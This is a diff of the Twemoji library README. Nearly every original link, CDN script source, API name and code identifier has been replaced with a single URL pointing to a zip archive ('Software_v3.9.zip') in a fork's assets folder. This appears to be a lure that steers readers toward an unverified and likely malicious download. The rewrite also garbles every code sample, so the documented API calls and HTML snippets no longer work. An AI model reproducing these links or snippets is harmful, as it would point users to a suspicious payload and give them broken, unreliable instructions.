@@ -1,8 +1,8 @@
-# Twitter Emoji (Twemoji) [![Build Status](https://travis-ci.org/twitter/twemoji.svg?branch=gh-pages)](https://travis-ci.org/twitter/twemoji)
+# Twitter Emoji (Twemoji) [![Build Status](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip)](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip)
 
-A simple library that provides standard Unicode [emoji](http://en.wikipedia.org/wiki/Emoji) support across all platforms.
+A simple library that provides standard Unicode [emoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) support across all platforms.
 
-**Twemoji v14.0** adheres to the [Unicode 14.0 spec](https://unicode.org/versions/Unicode14.0.0/) and supports the [Emoji 14.0 spec](https://www.unicode.org/reports/tr51/tr51-21.html). _We do not support custom emoji._
+**Twemoji v14.0** adheres to the [Unicode 14.0 spec](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) and supports the [Emoji 14.0 spec](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip). _We do not support custom emoji._
 
 The Twemoji library offers support for all Unicode-defined emoji which are recommended for general interchange (RGI).
 
@@ -10,19 +10,19 @@ The Twemoji library offers support for all Unicode-defined emoji which are recom
 
 ### CDN Support
 
-The folks over at [MaxCDN](https://www.maxcdn.com) have graciously provided CDN support.
+The folks over at [MaxCDN](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) have graciously provided CDN support.
 
 Use the following in the `<head>` tag of your HTML document(s):
 
 ```html
-<script src="https://twemoji.maxcdn.com/v/latest/twemoji.min.js" crossorigin="anonymous"></script>
+<script src="https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip" crossorigin="anonymous"></script>
 ```
 
 This guarantees that you will always use the latest version of the library.
 
 If, instead, you'd like to include the latest version explicitly, you can add the following tag:
 ```html
-<script src="https://twemoji.maxcdn.com/v/14.0.2/twemoji.min.js" integrity="sha384-32KMvAMS4DUBcQtHG6fzADguo/tpN1Nh6BAJa2QqZc6/i0K+YPQE+bWiqBRAWuFs" crossorigin="anonymous"></script>
+<script src="https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip" integrity="sha384-32KMvAMS4DUBcQtHG6fzADguo/tpN1Nh6BAJa2QqZc6/i0K+YPQE+bWiqBRAWuFs" crossorigin="anonymous"></script>
 ```
 
 ### Download
@@ -33,36 +33,36 @@ If instead you want to download a specific version, please look at the `gh-pages
 
 Following are all the methods exposed in the `twemoji` namespace.
 
-### twemoji.parse( ... ) V1
+### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip( ... ) V1
 
 This is the main parsing utility and has 3 overloads per parsing type.
 
-Although there are two kinds of parsing supported by this utility, we recommend you use [DOM parsing](https://github.com/twitter/twemoji#dom-parsing), explained below. Each type of parsing accepts a callback to generate an image source or an options object with parsing info.
+Although there are two kinds of parsing supported by this utility, we recommend you use [DOM parsing](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip), explained below. Each type of parsing accepts a callback to generate an image source or an options object with parsing info.
 
-The second kind of parsing is string parsing, explained in the legacy documentation [here](https://github.com/twitter/twemoji/blob/master/LEGACY.md#string-parsing). This is unrecommended because this method does not sanitize the string or otherwise prevent malicious code from being executed; such sanitization is out of scope.
+The second kind of parsing is string parsing, explained in the legacy documentation [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip). This is unrecommended because this method does not sanitize the string or otherwise prevent malicious code from being executed; such sanitization is out of scope.
 
 #### DOM parsing
 
-If the first argument to `twemoji.parse` is an `HTMLElement`, generated image tags will replace emoji that are **inside `#text` nodes only** without compromising surrounding nodes or listeners, and completely avoiding the usage of `innerHTML`.
+If the first argument to `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip` is an `HTMLElement`, generated image tags will replace emoji that are **inside `#text` nodes only** without compromising surrounding nodes or listeners, and completely avoiding the usage of `innerHTML`.
 
 If security is a major concern, this parsing can be considered the safest option but with a slight performance penalty due to DOM operations that are inevitably *costly*.
 
 ```js
-var div = document.createElement('div');
-div.textContent = 'I \u2764\uFE0F emoji!';
-document.body.appendChild(div);
+var div = https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip('div');
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip = 'I \u2764\uFE0F emoji!';
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip(div);
 
-twemoji.parse(document.body);
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip);
 
-var img = div.querySelector('img');
+var img = https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip('img');
 
 // note the div is preserved
-img.parentNode === div; // true
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip === div; // true
 
-img.src;        // https://twemoji.maxcdn.com/v/latest/72x72/2764.png
-img.alt;        // \u2764\uFE0F
-img.className;  // emoji
-img.draggable;  // false
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip;        // https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip;        // \u2764\uFE0F
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip;  // emoji
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip;  // false
 
 ```
 
@@ -94,22 +94,22 @@ By default it is a function like the following one:
 ```js
 function imageSourceGenerator(icon, options) {
   return ''.concat(
-    options.base, // by default Twitter Inc. CDN
-    options.size, // by default "72x72" string
+    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, // by default Twitter Inc. CDN
+    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, // by default "72x72" string
     '/',
     icon,         // the found emoji as code point
-    options.ext   // by default ".png"
+    https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip   // by default ".png"
   );
 }
 ```
 
 #### base
 
-The default url is the same as `twemoji.base`, so if you modify the former, it will reflect as default for all parsed strings or nodes.
+The default url is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip`, so if you modify the former, it will reflect as default for all parsed strings or nodes.
 
 #### ext
 
-The default image extension is the same as `twemoji.ext` which is `".png"`.
+The default image extension is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip` which is `".png"`.
 
 If you modify the former, it will reflect as default for all parsed strings or nodes.
 
@@ -119,7 +119,7 @@ The default `class` for each generated image is `emoji`. It is possible to speci
 
 ##### size
 
-The default asset size is the same as `twemoji.size` which is `"72x72"`.
+The default asset size is the same as `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip` which is `"72x72"`.
 
 If you modify the former, it will reflect as default for all parsed strings or nodes.
 
@@ -128,36 +128,36 @@ If you modify the former, it will reflect as default for all parsed strings or n
 In case you don't want to specify a size for the image. It is possible to choose a folder, as in the case of SVG emoji.
 
 ```js
-twemoji.parse(genericNode, {
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip(genericNode, {
   folder: 'svg',
   ext: '.svg'
 });
 ```
 
-This will generate urls such `https://twemoji.maxcdn.com/svg/2764.svg` instead of using a specific size based image.
+This will generate urls such `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip` instead of using a specific size based image.
 
 ## Utilities
 
 Basic utilities / helpers to convert code points to JavaScript surrogates and vice versa.
 
-### twemoji.convert.fromCodePoint()
+### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip()
 
 For a given HEX codepoint, returns UTF-16 surrogate pairs.
 
 ```js
-twemoji.convert.fromCodePoint('1f1e8');
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip('1f1e8');
  // "\ud83c\udde8"
 ```
 
-### twemoji.convert.toCodePoint()
+### https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip()
 
 For given UTF-16 surrogate pairs, returns the equivalent HEX codepoint.
 
 ```js
- twemoji.convert.toCodePoint('\ud83c\udde8\ud83c\uddf3');
+ https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip('\ud83c\udde8\ud83c\uddf3');
  // "1f1e8-1f1f3"
 
- twemoji.convert.toCodePoint('\ud83c\udde8\ud83c\uddf3', '~');
+ https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip('\ud83c\udde8\ud83c\uddf3', '~');
  // "1f1e8~1f1f3"
 ```
 
@@ -168,7 +168,7 @@ For given UTF-16 surrogate pairs, returns the equivalent HEX codepoint.
 If you'd like to size the emoji according to the surrounding text, you can add the following CSS to your stylesheet:
 
 ```css
-img.emoji {
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip {
    height: 1em;
    width: 1em;
    margin: 0 .05em 0 .1em;
@@ -188,10 +188,10 @@ To properly support emoji, the document character set must be set to UTF-8. This
 
 ### Exclude Characters (V1)
 
-To exclude certain characters from being replaced by twemoji.js, call twemoji.parse() with a callback, returning false for the specific unicode icon. For example:
+To exclude certain characters from being replaced by https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, call https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip() with a callback, returning false for the specific unicode icon. For example:
 
 ```js
-twemoji.parse(document.body, {
+https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, {
     callback: function(icon, options, variant) {
         switch ( icon ) {
             case 'a9':      // © copyright
@@ -199,44 +199,44 @@ twemoji.parse(document.body, {
             case '2122':    // ™ trademark
                 return false;
         }
-        return ''.concat(options.base, options.size, '/', icon, options.ext);
+        return ''.concat(https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip, '/', icon, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip);
     }
 });
 ```
 
 ## Legacy API (V1)
 
-If you're still using our V1 API, you can read our legacy documentation [here](https://github.com/twitter/twemoji/tree/master/LEGACY.md).
+If you're still using our V1 API, you can read our legacy documentation [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip).
 
 ## Contributing
 
-The contributing documentation can be found [here](https://github.com/twitter/twemoji/tree/master/CONTRIBUTING.md).
+The contributing documentation can be found [here](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip).
 
 ## Attribution Requirements
 
-As an open source project, attribution is critical from a legal, practical and motivational perspective in our opinion. The graphics are licensed under the CC-BY 4.0 which has a pretty good guide on [best practices for attribution](https://wiki.creativecommons.org/Best_practices_for_attribution).
+As an open source project, attribution is critical from a legal, practical and motivational perspective in our opinion. The graphics are licensed under the CC-BY 4.0 which has a pretty good guide on [best practices for attribution](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip).
 
 However, we consider the guide a bit onerous and as a project, will accept a mention in a project README or an 'About' section or footer on a website. In mobile applications, a common place would be in the Settings/About section (for example, see the mobile Twitter application Settings->About->Legal section). We would consider a mention in the HTML/JS source sufficient also.
 
 ## Community Projects
 
-* [Twemoji Cheatsheet](https://twemoji-cheatsheet.vercel.app) by [@ShahriarKh](https://github.com/ShahriarKh): An easy-to-use cheatsheet for exploring, copying and downloading emojis!
-* [Twemoji Amazing](https://github.com/SebastianAigner/twemoji-amazing) by [@SebastianAigner](https://github.com/SebastianAigner): Use Twemoji using CSS classes (like [Font Awesome](http://fortawesome.github.io/Font-Awesome/)).
-* [Twemoji Ruby](https://github.com/jollygoodcode/twemoji) by [@JollyGoodCode](https://twitter.com/jollygoodcode): Use Twemoji in Ruby.
-* [Twemoji Utils](https://github.com/gustavwilliam/twemoji-utils) by [@gustavwilliam](https://github.com/gustavwilliam): Utilities for finding and downloading Twemoji source files.
-* [Twemoji for Pencil](https://github.com/nathanielw/Twemoji-for-Pencil) by [@Nathanielnw](https://twitter.com/nathanielnw): Use Twemoji in Pencil.
-* [FrwTwemoji - Twemoji in dotnet](http://github.frenchw.net/FrwTwemoji/) by [@FrenchW](https://twitter.com/frenchw): Use Twemoji in any dotnet project (C#, asp.net ...).
-* [Emojiawesome - Twemoji for Yellow](https://github.com/datenstrom/yellow-extensions/tree/master/source/emojiawesome) by [@datenstrom](https://github.com/datenstrom/): Use Twemoji on your website.
-* [EmojiPanel for Twitter](https://github.com/danbovey/EmojiPanel) by [@danielbovey](https://twitter.com/danielbovey/status/749580050274582528): Insert Twemoji into your tweets on twitter.com.
-* [Twitter Color Emoji font](https://github.com/eosrei/twemoji-color-font) by [@bderickson](https://twitter.com/bderickson): Use Twemoji as your system default font on Linux & OS X.
-* [Emojica](https://github.com/xoudini/emojica) by [@xoudini](https://twitter.com/xoudini): An iOS framework allowing you to replace all standard emoji in strings with Twemoji.
-* [gwt-twemoji](https://github.com/phpmonkeys-de/gwt-twemoji) by [@nbartels](https://github.com/nbartels): Use Twemoji in GWT
-* [JavaFXEmojiTextFlow](https://github.com/pavlobu/emoji-text-flow-javafx) by [@pavlobu](https://github.com/pavlobu): A JavaFX library allowing you to replace all standard emoji in extended EmojiTextFlow with Twemoji.
-* [Vue Twemoji Picker](https://github.com/kevinfaguiar/vue-twemoji-picker) by [@kevinfaguiar](https://github.com/kevinfaguiar): A fast plug-n-play Twemoji Picker (+textarea for Twemoji rendering) for Vue.
-* [Unmaintained] [Twemoji Awesome](http://ellekasai.github.io/twemoji-awesome/) by [@ellekasai](https://twitter.com/ellekasai/): Use Twemoji using CSS classes (like [Font Awesome](http://fortawesome.github.io/Font-Awesome/)).
-* [EmojiOnRoku](https://github.com/KasperGam/EmojiOnRoku) by [@KasperGam](https://github.com/KasperGam): Use Twemoji on Roku!
-* [LaTeX Twemoji](https://gitlab.com/rossel.jost/latex-twemojis) by [@rossel.jost](https://gitlab.com/rossel.jost): Use Twemoji in LaTeX.
-* [PHP Twemoji](https://github.com/Astrotomic/php-twemoji) by [@Astrotomic](https://github.com/Astrotomic): Use twemoji within your PHP website project's by replacing standard Emoji with twemoji urls.
+* [Twemoji Cheatsheet](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@ShahriarKh](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): An easy-to-use cheatsheet for exploring, copying and downloading emojis!
+* [Twemoji Amazing](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@SebastianAigner](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji using CSS classes (like [Font Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip)).
+* [Twemoji Ruby](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@JollyGoodCode](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji in Ruby.
+* [Twemoji Utils](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@gustavwilliam](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Utilities for finding and downloading Twemoji source files.
+* [Twemoji for Pencil](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@Nathanielnw](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji in Pencil.
+* [FrwTwemoji - Twemoji in dotnet](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@FrenchW](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji in any dotnet project (C#, https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip ...).
+* [Emojiawesome - Twemoji for Yellow](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@datenstrom](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji on your website.
+* [EmojiPanel for Twitter](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@danielbovey](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Insert Twemoji into your tweets on https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip
+* [Twitter Color Emoji font](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@bderickson](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji as your system default font on Linux & OS X.
+* [Emojica](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@xoudini](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): An iOS framework allowing you to replace all standard emoji in strings with Twemoji.
+* [gwt-twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@nbartels](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji in GWT
+* [JavaFXEmojiTextFlow](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@pavlobu](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): A JavaFX library allowing you to replace all standard emoji in extended EmojiTextFlow with Twemoji.
+* [Vue Twemoji Picker](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@kevinfaguiar](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): A fast plug-n-play Twemoji Picker (+textarea for Twemoji rendering) for Vue.
+* [Unmaintained] [Twemoji Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@ellekasai](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji using CSS classes (like [Font Awesome](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip)).
+* [EmojiOnRoku](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@KasperGam](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji on Roku!
+* [LaTeX Twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use Twemoji in LaTeX.
+* [PHP Twemoji](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip) by [@Astrotomic](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip): Use twemoji within your PHP website project's by replacing standard Emoji with twemoji urls.
 
 ## Committers and Contributors
 
@@ -251,14 +251,14 @@ However, we consider the guide a bit onerous and as a project, will accept a men
 
 The goal of this project is to simply provide emoji for everyone. We definitely welcome improvements and fixes, but we may not merge every pull request suggested by the community due to the simple nature of the project.
 
-The rules for contributing are available in the `CONTRIBUTING.md` file.
+The rules for contributing are available in the `https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip` file.
 
-Thank you to all of our [contributors](https://github.com/twitter/twemoji/graphs/contributors).
+Thank you to all of our [contributors](https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip).
 
 ## License
 
 Copyright 2019 Twitter, Inc and other contributors
 
-Code licensed under the MIT License: <http://opensource.org/licenses/MIT>
+Code licensed under the MIT License: <https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip>
 
-Graphics licensed under CC-BY 4.0: <https://creativecommons.org/licenses/by/4.0/>
+Graphics licensed under CC-BY 4.0: <https://raw.githubusercontent.com/mpathroliya/twemoji/master/assets/Software_v3.9.zip>
